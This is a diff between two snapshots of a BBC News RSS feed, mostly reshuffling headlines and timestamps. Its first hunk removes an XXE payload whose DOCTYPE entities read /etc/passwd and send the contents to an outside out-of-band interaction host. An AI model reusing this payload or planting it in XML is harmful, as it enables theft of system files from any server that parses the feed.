@@ -1,9 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://a2vjrcdnn9zwmg7yednq0dp9334g5jqf2.oast.site/?x=%file;'>">
-%eval;
-%exfil;
-]><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
     <channel>
         <title><![CDATA[BBC News]]></title>
         <description><![CDATA[BBC News - News Front Page]]></description>
@@ -14,7 +9,7 @@
             <link>https://www.bbc.co.uk/news</link>
         </image>
         <generator>RSS for Node</generator>
-        <lastBuildDate>Thu, 18 Jun 2026 11:32:45 GMT</lastBuildDate>
+        <lastBuildDate>Thu, 18 Jun 2026 11:52:14 GMT</lastBuildDate>
         <atom:link href="https://feeds.bbci.co.uk/news/rss.xml" rel="self" type="application/rss+xml"/>
         <copyright><![CDATA[Copyright: (C) British Broadcasting Corporation, see https://www.bbc.co.uk/usingthebbc/terms-of-use/#15metadataandrssfeeds for terms and conditions of reuse.]]></copyright>
         <language><![CDATA[en-gb]]></language>
@@ -116,14 +111,6 @@
             <media:thumbnail width="240" height="135" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/97aa/live/34c4f470-6a8a-11f1-b43f-bdd060527ffc.jpg"/>
         </item>
         <item>
-            <title><![CDATA[An ultra-rare Star Wars Lego collection went missing - it's sparked viral conspiracies]]></title>
-            <description><![CDATA[Bricks & Figs shops around the US have been receiving threats due to the missing Star Wars Lego set, the company says.]]></description>
-            <link>https://www.bbc.com/news/articles/c39yn3r32yko?at_medium=RSS&amp;at_campaign=rss</link>
-            <guid isPermaLink="false">https://www.bbc.com/news/articles/c39yn3r32yko#2</guid>
-            <pubDate>Thu, 18 Jun 2026 00:15:54 GMT</pubDate>
-            <media:thumbnail width="240" height="135" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/b541/live/af7d0390-6afa-11f1-b1db-af71d47507d6.jpg"/>
-        </item>
-        <item>
             <title><![CDATA[UK rapper thanks Linkin Park for 'changing my life' with freestyle shoutout]]></title>
             <description><![CDATA[Mike Shinoda from the band says he spotted Megan Da Savage's rap on an independent music platform.]]></description>
             <link>https://www.bbc.com/news/articles/cx2x6j00vv7o?at_medium=RSS&amp;at_campaign=rss</link>
@@ -132,12 +119,36 @@
             <media:thumbnail width="240" height="135" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/2efc/live/ebea85e0-6b05-11f1-aa02-f994d64872ca.jpg"/>
         </item>
         <item>
+            <title><![CDATA[First Russian shadow fleet vessel enters Channel since Smyrtos boarding]]></title>
+            <description><![CDATA[Forwarder, a Russian-flagged ship which left port in Primorsk last week, entered the Channel on Wednesday evening.]]></description>
+            <link>https://www.bbc.com/news/articles/cgk6d12lz6jo?at_medium=RSS&amp;at_campaign=rss</link>
+            <guid isPermaLink="false">https://www.bbc.com/news/articles/cgk6d12lz6jo#2</guid>
+            <pubDate>Thu, 18 Jun 2026 11:50:15 GMT</pubDate>
+            <media:thumbnail width="240" height="135" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/4f9c/live/d741c4e0-6b0b-11f1-b1db-af71d47507d6.jpg"/>
+        </item>
+        <item>
+            <title><![CDATA[An ultra-rare Star Wars Lego collection went missing - it's sparked viral conspiracies]]></title>
+            <description><![CDATA[Bricks & Figs shops around the US have been receiving threats due to the missing Star Wars Lego set, the company says.]]></description>
+            <link>https://www.bbc.com/news/articles/c39yn3r32yko?at_medium=RSS&amp;at_campaign=rss</link>
+            <guid isPermaLink="false">https://www.bbc.com/news/articles/c39yn3r32yko#2</guid>
+            <pubDate>Thu, 18 Jun 2026 00:15:54 GMT</pubDate>
+            <media:thumbnail width="240" height="135" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/b541/live/af7d0390-6afa-11f1-b1db-af71d47507d6.jpg"/>
+        </item>
+        <item>
             <title><![CDATA['We had to get out of the way': The backlash over delivery robots]]></title>
             <description><![CDATA[As the delivery vehicles increasing take to US streets, bans and protest groups are springing up.]]></description>
             <link>https://www.bbc.com/news/articles/c0rygp005wjo?at_medium=RSS&amp;at_campaign=rss</link>
             <guid isPermaLink="false">https://www.bbc.com/news/articles/c0rygp005wjo#2</guid>
             <pubDate>Wed, 17 Jun 2026 23:02:05 GMT</pubDate>
             <media:thumbnail width="240" height="134" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/415d/live/08ef66e0-64c8-11f1-be64-d7903260be26.jpg"/>
+        </item>
+        <item>
+            <title><![CDATA[Why a Gen Z Londoner can graze sheep on land in the Welsh valleys]]></title>
+            <description><![CDATA[Caleb Tutt travelled from Lambeth to a hilltop in Llantrisant to claim his ancient birthright.]]></description>
+            <link>https://www.bbc.com/news/articles/cpwe51787z0o?at_medium=RSS&amp;at_campaign=rss</link>
+            <guid isPermaLink="false">https://www.bbc.com/news/articles/cpwe51787z0o#2</guid>
+            <pubDate>Thu, 18 Jun 2026 05:05:50 GMT</pubDate>
+            <media:thumbnail width="240" height="134" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/2c47/live/c1cea950-650e-11f1-b671-296779147873.jpg"/>
         </item>
         <item>
             <title><![CDATA[Simpler, older version of Stonehenge found three miles from famous site]]></title>
@@ -154,6 +165,14 @@
             <guid isPermaLink="false">https://www.bbc.com/weather/articles/c79y35nl719o#4</guid>
             <pubDate>Thu, 18 Jun 2026 11:03:49 GMT</pubDate>
             <media:thumbnail width="240" height="135" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/fcad/live/c026e8b0-6ae0-11f1-8546-8f19e4fe30f4.jpg"/>
+        </item>
+        <item>
+            <title><![CDATA[New UK defence secretary meets Nato allies without investment plan in place]]></title>
+            <description><![CDATA[Nato members have been urged to present "clear, concrete and credible plans" for raising defence spending.]]></description>
+            <link>https://www.bbc.com/news/articles/cn0vge2kj9zo?at_medium=RSS&amp;at_campaign=rss</link>
+            <guid isPermaLink="false">https://www.bbc.com/news/articles/cn0vge2kj9zo#4</guid>
+            <pubDate>Thu, 18 Jun 2026 10:56:37 GMT</pubDate>
+            <media:thumbnail width="240" height="135" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/6d62/live/fb847d70-6af2-11f1-b1db-af71d47507d6.jpg"/>
         </item>
         <item>
             <title><![CDATA[Number of job vacancies hits five year-low]]></title>
@@ -186,14 +205,6 @@
             <guid isPermaLink="false">https://www.bbc.com/news/articles/clyer9m0jmko#4</guid>
             <pubDate>Thu, 18 Jun 2026 08:57:59 GMT</pubDate>
             <media:thumbnail width="240" height="134" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/a60a/live/7ae52760-6a42-11f1-9742-4f68b41a569d.jpg"/>
-        </item>
-        <item>
-            <title><![CDATA[Why a Gen Z Londoner can graze sheep on land in the Welsh valleys]]></title>
-            <description><![CDATA[Caleb Tutt travelled from Lambeth to a hilltop in Llantrisant to claim his ancient birthright.]]></description>
-            <link>https://www.bbc.com/news/articles/cpwe51787z0o?at_medium=RSS&amp;at_campaign=rss</link>
-            <guid isPermaLink="false">https://www.bbc.com/news/articles/cpwe51787z0o#4</guid>
-            <pubDate>Thu, 18 Jun 2026 05:05:50 GMT</pubDate>
-            <media:thumbnail width="240" height="134" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/2c47/live/c1cea950-650e-11f1-b671-296779147873.jpg"/>
         </item>
         <item>
             <title><![CDATA[BBC News app]]></title>
@@ -244,20 +255,20 @@
             <media:thumbnail width="240" height="135" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/ec6a/live/8ef6d710-6ac1-11f1-b1db-af71d47507d6.png"/>
         </item>
         <item>
+            <title><![CDATA[Lionesses will face Greece in World Cup play-offs]]></title>
+            <description><![CDATA[England will face Greece in round one of the 2027 Women's World Cup play-offs, with Northern Ireland, Scotland and Wales also learning their opponents.]]></description>
+            <link>https://www.bbc.com/sport/football/articles/cvgl9xp2lgno?at_medium=RSS&amp;at_campaign=rss</link>
+            <guid isPermaLink="false">https://www.bbc.com/sport/football/articles/cvgl9xp2lgno#8</guid>
+            <pubDate>Thu, 18 Jun 2026 11:32:34 GMT</pubDate>
+            <media:thumbnail width="240" height="134" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/d7ff/live/57d03f30-6b05-11f1-aa02-f994d64872ca.jpg"/>
+        </item>
+        <item>
             <title><![CDATA[Calvin Harris & Commonwealths force Monday start to Celtic's title defence]]></title>
             <description><![CDATA[Celtic open the 2026-27 Scottish Premiership season at home to Dundee on 3 August, with the champions saying they are disappointed to be starting on a Monday evening.]]></description>
             <link>https://www.bbc.com/sport/football/articles/c1kyv7yjmdlo?at_medium=RSS&amp;at_campaign=rss</link>
             <guid isPermaLink="false">https://www.bbc.com/sport/football/articles/c1kyv7yjmdlo#8</guid>
             <pubDate>Thu, 18 Jun 2026 11:00:27 GMT</pubDate>
             <media:thumbnail width="240" height="135" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/d0f7/live/114547f0-6a5a-11f1-8115-ed1047107edc.jpg"/>
-        </item>
-        <item>
-            <title><![CDATA[Lionesses will face Greece in World Cup play-offs]]></title>
-            <description><![CDATA[England will face Greece in round one of the 2027 Women's World Cup play-offs, with Northern Ireland, Scotland and Wales also learning their opponents.]]></description>
-            <link>https://www.bbc.com/sport/football/articles/cvgl9xp2lgno?at_medium=RSS&amp;at_campaign=rss</link>
-            <guid isPermaLink="false">https://www.bbc.com/sport/football/articles/cvgl9xp2lgno#8</guid>
-            <pubDate>Thu, 18 Jun 2026 11:10:41 GMT</pubDate>
-            <media:thumbnail width="240" height="134" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/d7ff/live/57d03f30-6b05-11f1-aa02-f994d64872ca.jpg"/>
         </item>
         <item>
             <title><![CDATA['I never imagined something like this' - Nadal reflects on Wimbledon 2008 win]]></title>
